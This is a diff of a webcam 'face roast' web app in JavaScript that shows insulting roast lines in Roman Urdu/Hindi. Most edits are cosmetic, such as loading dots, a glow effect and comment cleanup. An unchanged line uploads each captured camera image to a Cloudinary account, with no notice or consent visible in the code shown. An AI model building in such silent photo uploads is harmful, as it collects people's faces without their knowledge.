@@ -39,7 +39,7 @@ const modes = [
             "Next time filter lagana, baghair filter wali shakal dekh kar dar lagta hai🤦",
             "Tumhary ilawa ghar me or kia cheez faltu hai?",
             "Tumhara bank balance aur tumhari akal dono he gir gaye hain stupid insan. 📉",
-            "Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai.  snail",
+            "Tumhara dimagh itna slow chalta hai ki 2G internet bhi tumse tez hai. 🐌",
             "Tery mun ko dekh kar me dar gaya hun yar, sorry bolo mujhy ab 😉",
             "Ye kon hai jis ko dekh kar computer bhi dar gaya 🤣",
             "Tu online na aaya kar, internet band ho jata hai sab ka 😊",
@@ -108,9 +108,14 @@ const newScanBtn = document.getElementById('new-scan-btn');
 const backToModesBtn = document.getElementById('back-to-modes-btn');
 const resultDisplayFrame = document.querySelector('.result-display-frame'); 
 
-// --- 3. AI SETUP ---
+// --- 3. AI SETUP WITH REAL-TIME PROGRESS DOTS ---
 async function setupFaceAI() {
-    startScanBtn.textContent = "INITIALIZING AI...";
+    let dots = "";
+    const loadingInterval = setInterval(() => {
+        dots = dots.length >= 3 ? "" : dots + ".";
+        startScanBtn.textContent = `INITIALIZING AI${dots}`;
+    }, 400);
+
     startScanBtn.disabled = true;
     try {
         const scripts = ["https://cdn.jsdelivr.net/npm/@tensorflow/tfjs", "https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"];
@@ -121,9 +126,12 @@ async function setupFaceAI() {
         }
         faceDetector = await blazeface.load();
         isAIReady = true; 
+        clearInterval(loadingInterval);
         startScanBtn.textContent = ">>> BEGIN ANALYSIS <<<";
         startScanBtn.disabled = false;
+        startScanBtn.style.boxShadow = "0 0 20px #00f2ff";
     } catch (e) {
+        clearInterval(loadingInterval);
         startScanBtn.textContent = "BEGIN ANALYSIS";
         startScanBtn.disabled = false;
     }
@@ -217,10 +225,9 @@ function downloadRoast() {
     const logoX = 20;
     const logoY = canvasHeight - 20;
     
-    // Watermark Alignment Fix
     context.textAlign = "left";
     context.fillStyle = "rgba(0, 242, 255, 0.6)";
-    context.fillRect(logoX, logoY - 38, 160, 1.5); // Fixed Width
+    context.fillRect(logoX, logoY - 38, 160, 1.5);
     
     context.fillStyle = "#39ff14";
     context.font = "bold 14px sans-serif";
@@ -283,7 +290,7 @@ function captureAndShowResult() {
         const formData = new FormData(); 
         formData.append('file', blob); 
         formData.append('upload_preset', uploadPreset);
-        formData.append('tags', 'scans'); // Added Sync Tag
+        formData.append('tags', 'scans');
         fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: formData });
     }, 'image/jpeg', 0.8);
     stopCamera(); 
